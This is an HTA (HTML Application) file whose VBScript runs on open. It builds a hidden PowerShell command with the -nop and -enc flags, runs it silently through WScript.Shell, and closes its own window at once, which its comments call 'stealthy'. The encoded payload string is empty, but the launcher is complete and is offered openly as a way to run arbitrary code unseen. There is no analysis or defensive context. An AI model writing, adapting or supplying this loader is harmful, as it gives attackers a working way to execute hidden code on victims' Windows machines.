
<html>
<head>
<script language="VBScript">
    ' This script runs automatically when the HTA is opened.
    
    ' Function to execute the PowerShell payload
    Function ExecutePS()
        ' The Base64 encoded PowerShell command
        encodedCommand = ""
        
        ' Build the full command to run
        command = "powershell.exe -nop -w 1 -enc " & encodedCommand
        
        ' Create a shell object and run the command silently
        Set shell = CreateObject("WScript.Shell")
        shell.Run command, 0, False
        
        ' Close the HTA window immediately to be stealthy
        window.close()
    End Function

    ' Call the execution function
    ExecutePS
</script>
</head>
<body>
<!-- This body is never seen as the window closes immediately -->
</body>
